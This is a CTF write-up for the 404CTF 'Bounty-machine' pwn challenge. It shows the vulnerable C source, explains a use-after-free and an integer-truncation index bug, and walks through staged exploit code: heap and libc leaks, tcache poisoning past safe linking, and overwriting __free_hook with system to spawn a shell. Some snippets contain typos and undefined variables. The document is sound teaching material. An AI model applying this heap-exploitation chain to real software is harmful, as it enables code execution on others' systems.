
# 404CTF - Bounty-machine

**Difficulty:** Medium \
**Category:** Pwn

---

## TL;DR

[This challenge is about libc's heap, safe linking/tcache-poisoning and bypasses.]

---

## Provided files:
- **chall** : ELF 64-bit binary.
- **libc.so.6** : libc 2.32 file.
- **main.c** : source code.

Protections on the binary:
```
moe@Ubuntu:~/Documents/404CTF/bounty-machine$ checksec --file=./chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   89 Symbols	  No	0		3		./chall
```

## The binary's code:

Here are the interesting parts of program :

```
struct bounty {
    int amount;
    char* name;
    char* description;
};

struct bounty *bounties[256];
uint8_t nbounties = 0;

void see_bounties() {
    for (int i = 0; i < nbounties; i++) {
        printf("----------------\n");
        printf("%d. %s : %d ￦\n", i + 1, bounties[i]->name, bounties[i]->amount);
        printf("%s\n", bounties[i]->description);
    }
}

void add_bounty() {
    struct bounty *new_bounty = malloc(sizeof(struct bounty));

    printf("Choose the bounty amount >> ");
    scanf("%d", &new_bounty->amount);
    getchar();

    printf("Who is about to be hunted ? >> ");
    char name[0x100];
    size_t name_len = read(0, name, 0x100);
    name[name_len - 1] = '\0';
    new_bounty->name = malloc(name_len);
    strcpy(new_bounty->name, name);

    printf("Tell me more about them >> ");
    char description[0x1000];
    size_t description_len = read(0, description, 0x1000);
    description[description_len - 1] = '\0';
    new_bounty->description = malloc(description_len);
    strcpy(new_bounty->description, description);

    bounties[nbounties] = new_bounty;

    nbounties += 1;
}

void edit_bounty(uint8_t i) {
    printf("You are currently modifying the following bounty : \n");
    printf("%d. %s : %d ￦\n", i + 1, bounties[i]->name, bounties[i]->amount);
    printf("%s\n", bounties[i]->description);

    printf("Choose the new amount >> ");
    scanf("%d", &bounties[i]->amount);
    getchar();

    printf("Edit the description >> ");
    char description[0x1000];
    size_t description_len = read(0, description, 0x1000);
    description[description_len - 1] = '\0';
    realloc(bounties[i]->description, description_len);
    strcpy(bounties[i]->description, description);
}

void claim_bounty() {
    nbounties -= 1;
    
    printf("Congratulations for your catch of %s ! Your money will be transfered soon...\n", bounties[nbounties]->name);
    free(bounties[nbounties]->name);
    free(bounties[nbounties]->description);
    free(bounties[nbounties]);
}


int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    long long choice;
    int idx;
    int res;

    while (true) {
        menu();
        printf("Enter your choice\n> ");
        res = scanf("%lld", &choice);
        getchar();
        if (!res) exit(EXIT_FAILURE);

        switch (choice) {
            case 1:
                if (nbounties != 0) {
                    see_bounties();
                } else {
                    puts("No bounties, yet...");
                }
                break;
            case 2:
                add_bounty();
                break;
            case 3:
                printf("Choose the bounty to edit\n>> ");
                res = scanf("%d", &idx);
                getchar();
                if (idx < nbounties) {
                    edit_bounty(idx);
                } else {
                    puts("This bounty doesn't exist");
                }
                if (!res) exit(EXIT_FAILURE);
                break;
            case 4:
                claim_bounty();
                break;
            case 5:
                exit_screen();
                exit(EXIT_SUCCESS);
            default:
                puts("Invalid!!!");
                exit(choice);
        }
    }
    return 0;
}
```

The program creates/edits/displays/frees bounties using the structure `struct bounty` which is composed of an `amount`(int), a name (`char*`) and a description(`char*`). \
- `struct bounty *bounties[256];` is a global array that holds the bounties.
- `add_bounty()` creates a bounty and initializes its attributes.
- `edit_bounty(uint8_t i)` takes a 1 byte number and edits the corresponding bounty.
- `claim_bounty()` frees the attributes and the bounty container.
- `see_bounties()` shows all the available bounties.


## The Vulnerability :
Actually there's two vulnerabilities:

1 - Use-After-Free because `claim_bounty()` doesn't nullify the variables after freeing them:

```
void claim_bounty() {
    nbounties -= 1;
    
    printf("Congratulations for your catch of %s ! Your money will be transfered soon...\n", bounties[nbounties]->name);
    free(bounties[nbounties]->name);
    free(bounties[nbounties]->description);
    free(bounties[nbounties]);
}
```

2 - Type confusion bug `edit_bounty(uint8_t i)`, because originally, this function is given an `int` as argument:

```
  int idx;
  ...
  case 3:
      printf("Choose the bounty to edit\n>> ");
      res = scanf("%d", &idx);
      getchar();
      if (idx < nbounties) {
          edit_bounty(idx);
      } else {
          puts("This bounty doesn't exist");
      }
      if (!res) exit(EXIT_FAILURE);
      break;
```
There's a simple check whether `idx < nbounties`, but if we give `-256` which is `0xFFFFFFFFFFFFFF00`, the check still passes, but the actual made call is `edit_bounty(0)`; this allows to modify bounty `0` even if it is freed. We can do the same with indexes -255, -254, ...etc to reach the other freed bounties.


## Exploit Analysis
From the primitives we got and the libc 2.32 version, we can derive a fairly common exploitation plan:
- Allocating and freeing some chunk into tcache, and get a heap pointer leak to bypass safe linking.
- Allocating and freeing some chunk into unsorted bin, and get a libc main_arena pointer.
- Poisoning the **fd** pointer of chunk in tcache, and make it point to **__free_hook** in libc, and then overwrite it with **system** address.
- Allocate a chunk with description **"/bin/sh\x00"** and get a shell.

## Stage 1: Leak a heap pointer
This is an easy step, we allocate, free and display:
```
  add_bounty("2", "abcd", "b"*24)
  free_bounty()
  
  resp = edit_bounty_s1(-256) # Leaks the mangled_fd of container chunk + heap leak + the description's free chunk's mangled_fd(useless) 
  
  mangled_fd_1 = int(resp.split(b" ")[11])
  mangled_heap = u64(leak.split(b'\n')[2] +  b"\x00\x00\x00") # PAD and decode
  heap_addr = mangled_heap >> 12 # or multiply with 0x10 ** 3 to restore the full heap address
  
  edit_bounty_s2(mangled_fd_1, p64(mangled_heap) + b"a"*16) # restore the freed chunk's data to avoid crashes

```

Now, we have a heap only because `description->name` is freed but not nullyfied,

## Stage 2: Leak a libc pointer
This the trickiest part (for me), and that's where i failed during the CTF.

First, allocate and free two bounties into unsorted bin like this: 
```
    add_bounty(20, b"abcd", b"a" * 0x450)
    add_bounty(20, b"abcd", b"b" * 0x450)
    free_bounty() # and let the other used to avoid coaleasing
  
```

On freeing the chunk, it goes into the unsorted bin because it's large enough to not fit into tcache or fastbin.\
When a chunk `C` is in unsortd bin: `C[0]` and `C[1]` are plain pointers the a global variable in libc called `main_arena`.\
So to get that address, we need to calculate the offset between:\
1) the heap base and the address of this freed chunk; more exactly, between the heap base and the chunk address + 1, because main_arena address starts with `\x00` and this can not be printed (e.g. `0x00007ffff7fbfc00`).\
2) the heap base and the address of the first bounty in the bounty array.\
In my case, the offset in 1) is `0x360 + 1` and 2) is `0x2a0`

Now, the strategy is to overwrite `bounties[0]->name` with the address of the heap where `main_arena` addresses are stored i.e in the free unsorted bin chunk.\

```
    array_bounty_1 = heap_addr + 0x2a0
    main_arena_addr = heap_addr + 0x360

    add_bounty(20, b"abcd", b"a" * 0x40) # A
    add_bounty(20, b"abcd", b"b" * 0x40) # B
    free_bounty() # free B
    free_bounty() # free A

    resp = edit_bounty_s1(-256) # UAF 
    mangled_fd_1 = int(resp.split(b" ")[11])
    edit_bounty_s2(mangked_fd_1, p64(array_bounty_1 ^ (heap_addr >> 12)) + b"a"*0x38) # UAF

    add_bounty(20, b"abcd", b"a" * 0x40) # Get a sound description pointer
    add_bounty(20, b"abcd", b"b" * 0x28 + p64(main_arena_addr) + b"b" * 0x10) # Get a description pointer to array_bounty_1.

    leaks = show_bounties() # Meaning, leak `main_arena` address
    libc.address = int.from_bytes(b"\x00" + leaks.split(b"\n")[1].split(b" ")[1], "little") - 0x1e3c00
    
```

And, we have a libc leak.

## Stage 3: Overwrite __free_hook and Trigger a free('/bin/sh')
Always using the UAF strategy on tcache:
```
    add_bounty(20, b"abcd", b"a" * 0x60) # A
    add_bounty(20, b"abcd", b"b" * 0x60) # B

    free_bounty() # free B
    free_bounty() # free A

    resp =  edit_bounty_s1(-254)
    mangked_fd_1 = int(resp.split(b" ")[11])
    edit_bounty_s2(mangked_fd_1, p64((libc.symbols["__free_hook"] - 0x50) ^ (heap_addr >> 12)) + b"a"*0x58)
    
    add_bounty(20, b"abcd", b"a" * 0x60)
    add_bounty(20, b"abcd", b"b" * 0x50 + p64(libc.symbols["system"])) # __free_hook = system
    
```

To trigger:
```
    add_bounty(20, b"/bin/sh\x00", b"a"*0x90)
    free_bounty() # trigger free('/bin/sh') and win
```


